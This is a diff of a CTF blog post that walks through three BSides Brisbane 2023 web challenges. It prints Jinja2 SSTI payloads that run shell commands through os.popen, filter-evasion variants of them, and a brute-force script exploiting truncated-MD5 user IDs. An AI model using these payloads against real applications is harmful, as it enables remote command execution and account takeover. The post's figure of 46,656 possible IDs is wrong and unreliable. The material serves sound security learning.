@@ -1,15 +1,16 @@
 ---
 year: 2023
 month: 07
-day: 18
+day: 25
 ---
-# BSides Brisbane 2023 - Writeups (Part 2: web, pwn)
+# BSides Brisbane 2023 - Writeups (Part 2: web)
 
 The BSides Brisbane CTF was an exciting mix of traditional jeopardy challenges, and
 hardware/enterprise hacking. Huge props to the team who made this top quality CTF happen!
 
 In part 1 I covered all crypto and rev challenges along with an interesting IoT challenge.
-In this part I'll cover some of the web challenges and both of the pwn challenges.
+In this part I'll cover some of the web challenges, and in the next I'll cover both of the
+pwn challenges (this post started getting a bit too long).
 
 ## Overview
 
@@ -295,3 +296,240 @@ of the XSS challenges for 800 points, but spent multiple hours on `protec` (a pw
 that didn't get a second solve right until the end) for just 350 points. The CTF devs
 did a great job with the CTF, but I think the scoring could do with some tuning next
 year.
+
+---
+
+## ninja1 (web - 200 points)
+
+> I made a super secure website!
+>
+> Author: deluqs
+
+We're presented with a website which allows us to; sign up, log in, change our details,
+view our details, and see a dev page which shows how many people have signed up. I looked
+around for a little while trying to create accounts and change their usernames to contain
+HTML, SSTI payloads and SQLi payloads, but I couldn't see any signs that any of them had
+done anything. That's when I realised that the very janky looking dev page contained our
+username in a message along the lines of; `hi username, there are 4 people registered`.
+Given that the page was simply just text without any styles whatsoever, I was pretty
+suspicious that it might be vulnerable to [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti).
+I was suspicious because often SSTI will occur when a dev tries to hack together a page
+quickly and can't be bothered creating a new template file so they just give Flask the
+template as a string (forgetting that it shouldn't contain user input).
+
+I once again set my username to the classic `{{7*7}}` SSTI payload (no clue why it's a
+classic), and it worked! On the dev page my username was displayed as `49`. I changed my
+username a few more times to run `ls` and `ls /` followed by `cat /flag`, and found the flag
+pretty quickly.
+
+```python
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag').read() }}
+```
+Figure 14: *the payloads I used to locate and read the flag.*
+
+Flag: `flag{th4t-w4s-@-whoopssti}`
+
+### Conclusion
+
+This was a nice introductory SSTI with a few more elements to figure out than usual,
+making it that much more fun! Very well made challenge with an element of realism.
+
+---
+
+## ninja2 (web - 250 points)
+
+> Ok I've learnt from my mistakes, hackers won't be able to get in this time. [Period].
+> 
+> Author: deluqs
+
+The attack vector is essentially the same as in ninja1, except this time there are some
+pesky filters in place! Please note that adding filters is not a safe fix for SSTI in
+the real world, it's just a bandaid. The filters block `.`, `[`, and `]`, and
+later on I found that they may have been interfering with my ability to access members
+of the `self.__init__.__globals__.__builtins__` object via `attr` (although that could
+just be me misunderstanding Jinja's `attr` filter).
+
+```python
+{{ getattr(getattr(getattr(getattr(getattr(getattr(self, "__init__"), "__globals__"), "__builtins__"), "__import__")('os'), "popen")('ls'), "read")() }}
+{{ ((((((((self|attr("__init__"))|attr("__globals__"))|attr("__builtins__"))|attr("__import__"))('os'))|attr("popen"))("ls"))|attr("read"))() }}
+```
+Figure 15: *two possible variants of my ninja1 payloads which avoid the blocked characters.*
+
+First I tried just modifying my ninja1 payload to use two different ways of replacing
+the member accesses (Figure 15). I knew about the first method already, but it didn't work because
+`getattr` is only available in Python and not Jinja. I found out about the second method
+(using the `attr` filter) by reading through [Jinja's list of builtin filters](https://jinja.palletsprojects.com/en/3.0.x/templates/#builtin-filters).
+The second method also didn't work (it showed up empty in the dev page) so I tried slowly removing
+layers of member accesses until I got something that worked. I found that I could get
+accessing `self.__init__.__globals__.__builtins__` to work, but if I tried to access
+any of its members I got back nothing. At this point I spun up a script to allow me
+to test Jinja payloads locally. This was super valuable because I could
+get a lot of important information from the error messages.
+
+```python
+from flask import Flask, render_template_string
+
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    template = """
+    your_payload_goes_here
+    """
+    return render_template_string(template)
+
+app.run("0.0.0.0", port=8091)
+```
+Figure 16: *a crude setup for testing Jinja payloads.*
+
+To use the test script simply modify the value of the `template` variable, run the script,
+and visit `http://localhost:8091/`. You'll need to re-run the script every time that you edit the template since
+Flask won't auto re-run on file change (but if I remember correctly you may able to achieve
+such behaviour by using the `flask` cli to run the script).
+
+While trying to find alternative ways to access members of the `__builtins__` object I
+realised that I could possibly use Jinja's
+for loop block to iterate over the key-value pairs of `__builtins__` and use an `if`
+block to single out the value that I was interested in. It worked! I'm not entirely sure
+why I ended up going with using `eval` to run the `os.popen` phase of the payload,
+but it was likely just the result of trying out a bunch of options until one worked.
+
+```python
+{% for k, val in (((self|attr("__init__"))|attr("__globals__"))|attr("items"))() %}
+  {% if k == "__builtins__" %}
+    {% for k2, val2 in (val|attr("items"))() %}
+      {% if k2 == "eval" %}
+        {{val2("getattr(getattr(__import__('os'), 'popen')('cat /flag'), 'read')()")}}<br />
+      {% endif %}
+    {% endfor %}
+  {% endif %}
+{% endfor %}
+```
+Figure 17: *the final payload (with line breaks and indentation added for readability).*
+
+I forgot to write down the flag and can't find it back 🤦‍♂️, but I promise it worked!
+
+On a high level, my approach was basically just tweak the original payload
+incrementally until it worked and didn't include any banned characters 😅 I know,
+very useful advice.
+
+### Conclusion
+
+I had to get quite creative with my solution, well made challenge!
+
+---
+
+## Coincidence (web - 250 points)
+
+> Do you have thoughts you'd like to jot down? Well do I have the app for you!
+> 
+> Author: deluqs
+
+We're presented with a simple note storage website with the ability to sign up and
+log in. Importantly, we also get all of the code for the website which is essential
+for solving this challenge.
+
+Attempting to sign up with `stackotter@stackotter.dev` gives us an error which
+notifies us that only BSides BNE users are allowed to sign up. Looking at the code
+for `/signup` reveals that this is the result of a check that emails must end with
+`@bsidesbne.com`. Simple enough to satisfy.
+
+After signing up with a random `@bsidesbne.com` email address I poked around and found
+that I could create notes, view notes, and list all of my created notes. These
+challenges usually have the contained in the admin's notes, so I kept that in mind
+as I looked through the code. My first thought was to try signing up with `admin@bsidesbne.com`.
+It was taken, which I assumed meant that that was the admin's email (although a
+random player could've technically signed up with it). `models.py` had a `generate_uid`
+function which used `md5` (which should set off alarm bells in any hacker's head).
+Let's take a closer look at `models.py`.
+
+```python
+from flask_login import UserMixin
+from hashlib import md5
+from werkzeug.security import generate_password_hash
+from . import db
+
+class User(UserMixin, db.Model):
+    __tablename__ = 'users'
+    email = db.Column(db.String(100), primary_key=True, unique=True)
+    id = db.Column(db.String(64))
+    password = db.Column(db.String(100))
+    name = db.Column(db.String(1000))
+    notes = db.relationship('Note', backref='owner', lazy=True)
+
+    def generate_uid(self, email: str):
+        return md5(email.encode('utf-8')).hexdigest()[:6]
+    
+    def get_id(self):
+        return self.email
+
+    def __init__(self, email, password, name):
+        self.email = email
+        self.password = generate_password_hash(password, method='sha256')
+        self.id = self.generate_uid(email)
+        self.name = name
+
+class Note(db.Model):
+    __tablename__ = 'notes'
+    id = db.Column(db.Integer, primary_key=True)
+    uid = db.Column(db.String(8), db.ForeignKey('users.id'), nullable=False)
+    content = db.Column(db.String(2000))
+```
+Figure 18: *the contents of `models.py`.*
+
+The database uses `generate_uid` to generate the `id` field of each new user, and
+also uses this `id` field to link notes to users. If we can find a way to get the
+same `uid` as the admin, we'll be able to see their notes!
+
+The `generate_uid` function's weakness isn't actually that it uses `md5`, it's that
+it only uses the first 6 characters of the hash (making collisions extremely likely).
+But even if it used the whole hash, hashes aren't a very good way of generating
+database ids. There's a reason that almost every database uses serial auto-incrementing
+primary keys.
+
+Forcing a collision to happen is pretty easy because the generated `uid` is just
+the first 6 characters of the md5 hash of our email (which we control). This function
+can only generate 46656 unique ids, which makes finding a collision not only easy,
+but super fast (it takes less than a second).
+
+Assuming that `admin@bsidesbne.com` was the email address of the account that we
+needed to find a collision for, I wrote a quick and dirty Python script (excuse the
+nesting).
+
+```python
+from hashlib import md5
+
+admin_email = "admin@bsidesbne.com"
+hash = md5(admin_email.encode('utf-8')).hexdigest()[:6]
+
+chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+for a in chars:
+    for b in chars:
+        for c in chars:
+            for d in chars:
+                for e in chars:
+                    for f in chars:
+                        for g in chars:
+                            for h in chars:
+                                email = a + b + c + d + e + f + g + h + "@bsidesbne.com"
+                                if md5(email.encode('utf-8')).hexdigest()[:6] == hash:
+                                    print(email)
+                                    exit(0)
+```
+Figure 19: *the collision finding script.*
+
+The script essentially just generates a bunch of random `@bsidesbne.com` email
+addresses and compares the generated `uid`s with the generated `uid` for
+`admin@bsidesbne.com`. The colliding email that I found was `aaackp06@bsidesbne.com`.
+Signing up with this email presented me with a single note containing the flag.
+
+Flag: `flag{h4ndm4d3-1dEntif13rs-ar3-b4d}` (yes they are)
+
+### Conclusion
+
+Super fun code-review style challenge! We did have to guess that the admin's
+email was `admin@bsidesbne.com`, but in my opinion that made the challenge more
+realistic without making it too guessy, which I always appreciate (it was a
+pretty obvious guess).
